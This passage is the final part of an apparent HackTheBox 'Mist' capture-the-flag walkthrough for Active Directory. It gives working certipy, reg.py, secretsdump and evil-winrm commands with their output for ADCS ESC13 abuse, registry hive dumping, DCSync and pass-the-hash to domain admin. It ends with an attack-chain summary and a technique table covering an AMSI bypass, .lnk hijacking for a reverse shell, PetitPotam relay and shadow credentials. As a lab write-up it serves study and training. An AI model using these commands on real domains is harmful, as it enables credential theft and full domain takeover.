**Step 3: Use that Kerberos ticket to request cert via BackupSvcAuthentication (only accessible as Certificate Managers member)**

Using NTLM here fails with `CERTSRV_E_TEMPLATE_DENIED`. Must use Kerberos because the group membership only shows up in Kerberos tokens:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo KRB5CCNAME=svc_cabackup.ccache proxychains -q certipy req \
  -u svc_cabackup \
  -k -no-pass \
  -ca mist-DC01-CA \
  -template BackupSvcAuthentication \
  -dc-ip 192.168.100.100 \
  -key-size 4096 \
  -target DC01.mist.htb
```

```
[*] Successfully requested certificate
[*] Saved certificate and private key to 'svc_cabackup.pfx'
```

**Step 4: Get new TGT with this cert (now includes ServiceAccounts → Backup Operators)**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100

┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache
[+] done
```

**Step 5: Backup Operators → dump registry hives from DC01**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo KRB5CCNAME=svc_cabackup.ccache proxychains -q reg.py \
  -k -no-pass \
  mist.htb/svc_cabackup@dc01.mist.htb \
  backup -o '\programdata'
```

```
[*] Saved HKLM\SAM to \programdata\SAM.save
[*] Saved HKLM\SYSTEM to \programdata\SYSTEM.save
[*] Saved HKLM\SECURITY to \programdata\SECURITY.save
```

Download all three through the op\_sharon WinRM shell:

```powershell
*Evil-WinRM* PS C:\programdata> download SAM.save
*Evil-WinRM* PS C:\programdata> download SECURITY.save
*Evil-WinRM* PS C:\programdata> download SYSTEM.save
```

**Step 6: secretsdump locally to get DC01 local hashes**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260
```

The local admin hash won't get us a remote login but we have the DC01 machine account hash. Use DCSync to get actual domain admin creds:

**Step 7: DCSync via DC01$ machine hash**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q secretsdump.py 'DC01$@DC01' -hashes :e768c4cf883a87ba9e96278990292260 -just-dc-ntlm
```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::
Brandon.Keywarp:1110:...:db03d6a77a2205bc1d07082740626cc9:::
op_Sharon.Mullard:1122:...:d25863965a29b64af7959c3d19588dd7:::
svc_cabackup:1135:...:c9872f1bc10bdd522c12fc2ac9041b64:::
DC01$:1000:...:e768c4cf883a87ba9e96278990292260:::
MS01$:1108:...:d682d620b887a24491038115b6dc56bb:::
[...snip...]
```

Domain Administrator NTLM: `b46782b9365344abdff1a925601e0385`

**Step 8: Shell**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q evil-winrm -i DC01 -u administrator -H b46782b9365344abdff1a925601e0385
```

```
Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
205a1594************************
```

Rooted.

***

### Attack Chain

```
[CVE-2024-9405: Pluck 4.7.18 Unauthenticated File Read]
          │
          ▼
[/data/modules/albums/albums_getimage.php → admin_backup.php]
[SHA-512 hash → CrackStation → admin password]
          │
          ▼
[Pluck Module Upload → PHP webshell]
[AMSI bypass (variable rename) → reverse shell as svc_web]
          │
          ▼
[C:\Common Applications writable .lnk files → malicious Notepad.lnk]
[Caught click → reverse shell as brandon.keywarp]
          │
          ▼
[ADCS: Certify + Rubeus → cert → PKINIT → NTLM for brandon.keywarp]
[Chisel SOCKS tunnel → proxychains enumeration]
[LDAP signing NOT enforced → PetitPotam relay viable]
          │
          ▼
[EtwStartWebClient → enable WebDAV]
[Chisel port forward MS01:22301 → our port 80]
[PetitPotam → coerce MS01$ auth → ntlmrelayx relay to DC01 LDAPS]
[LDAP shell as MS01$ → set_shadow_creds on MS01$]
          │
          ▼
[Certipy → shadow cred auth → MS01$ NTLM hash]
[Rubeus S4U2self → CIFS ticket as Administrator → wmiexec shell on MS01]
[user.txt]
          │
          ▼
[secretsdump MS01 → LSA secrets → svc_web cleartext]
[sharon.kdbx + image hint → hashcat -m 13400 mask → master password]
[KeePass → ImTiredOfThisJob:( → op_Sharon.Mullard → WinRM on DC01]
          │
          ▼
[BloodHound: Operatives → ReadGMSAPassword → svc_ca$ NTLM]
[svc_ca$ → AddKeyCredentialLink → shadow cred on svc_cabackup → NTLM]
          │
          ▼
[ADCS ESC13: ManagerAuthentication template + issuance policy OID group link]
[svc_cabackup cert via ManagerAuthentication → Certificate Managers in token]
[Kerberos ticket → cert via BackupSvcAuthentication → ServiceAccounts in token]
[ServiceAccounts → Backup Operators → reg.py backup SAM/SYSTEM/SECURITY]
[secretsdump local → DC01$ machine hash → DCSync → domain admin NTLM]
          │
          ▼
[evil-winrm as Administrator on DC01 → root.txt]
```

***

### Techniques&#x20;

| Technique                               | Tool / CVE                      | Notes                                                     |
| --------------------------------------- | ------------------------------- | --------------------------------------------------------- |
| Pluck CMS unauthenticated file read     | CVE-2024-9405                   | `/data/modules/albums/albums_getimage.php?image=`         |
| PHP webshell via Pluck module install   | Manual                          | Zip any PHP file, upload as module                        |
| AMSI signature bypass                   | Manual variable rename          | Changes string signatures without altering behaviour      |
| .lnk hijacking in shared folder         | PowerShell WScript.Shell        | Overwrites shortcut target to download+exec reverse shell |
| ADCS PKINIT → NTLM via Certify + Rubeus | Certify.exe, Rubeus.exe         | User cert → TGT → getcredentials                          |
| SOCKS tunnel                            | Chisel                          | Reverse tunnel over HTTP for proxychains                  |
| LDAP signing check                      | netexec -M ldap-checker         | Not enforced → relay attacks viable                       |
| Machine Account Quota check             | netexec -M maq                  | 0 → can't add fake computers                              |
| WebClient service start (non-admin)     | EtwStartWebClient.exe           | Needed for PetitPotam WebDAV coercion                     |
| PetitPotam MS-EFSRPC coercion           | PetitPotam.py                   | Coerces machine account auth via WebDAV                   |
| NTLM relay → LDAP shell                 | ntlmrelayx.py `-i`              | Authenticated as MS01$ on DC LDAPS                        |
| Shadow credentials                      | ntlmrelayx LDAP shell + Certipy | set\_shadow\_creds → cert → PKINIT → NTLM hash            |
| S4U2self Kerberos impersonation         | Rubeus s4u                      | Machine account TGT → CIFS TGS as domain admin            |
| KeePass master password crack           | hashcat `-m 13400 -a 3`         | Mask attack with 14 known chars + `?a`                    |
| GMSA password read                      | netexec `--gmsa`                | Operatives group → ReadGMSAPassword on svc\_ca$           |
| AddKeyCredentialLink abuse              | Certipy shadow auto             | svc\_ca$ → shadow cred on svc\_cabackup                   |
| ADCS ESC13 OID Group Link               | Certipy req + auth              | Cert token inherits linked group membership               |
| Backup Operators → registry hive dump   | impacket reg.py backup          | HKLM\SAM, SYSTEM, SECURITY → secretsdump local            |
| DCSync via machine account hash         | secretsdump.py DC01$            | Machine hash → DRSUAPI → full NTDS dump                   |

<figure><img src="../../../../.gitbook/assets/complete (38).gif" alt=""><figcaption></figcaption></figure>
